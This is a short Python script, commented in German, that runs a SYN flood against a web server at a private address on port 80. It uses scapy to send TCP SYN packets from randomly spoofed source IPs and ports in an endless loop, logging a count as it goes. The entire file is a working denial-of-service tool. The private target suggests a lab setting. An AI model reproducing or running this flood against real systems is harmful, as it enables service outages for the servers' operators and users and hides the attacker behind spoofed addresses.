from telnetlib import IP

from scapy.all import *
import random
import time

from scapy.layers.inet import TCP

# Ziel-Server und Port
target_ip = "10.211.55.4"  # IP des Webservers
target_port = 80

def syn_flood(target_ip, target_port):
    print(f"Starte SYN-Flood-Angriff auf {target_ip}:{target_port}...\n")

    packet_count = 0  # Zähler für gesendete Pakete

    while True:
        # Zufällige Quell-IP generieren
        src_ip = ".".join(map(str, (random.randint(1, 255) for _ in range(4))))
        src_port = random.randint(1024, 65535)  # Zufälliger Quellport

        # IP- und TCP-Header erstellen
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="S")
        packet = ip / tcp  # Paket zusammenstellen

        # Paket senden
        send(packet, verbose=False)
        packet_count += 1

        # Ausgabe alle 10 Pakete
        if packet_count % 10 == 0:
            print(f"{packet_count} SYN-Pakete gesendet... Letzte Quelle: {src_ip}:{src_port}")

        time.sleep(0.1)

syn_flood(target_ip, target_port)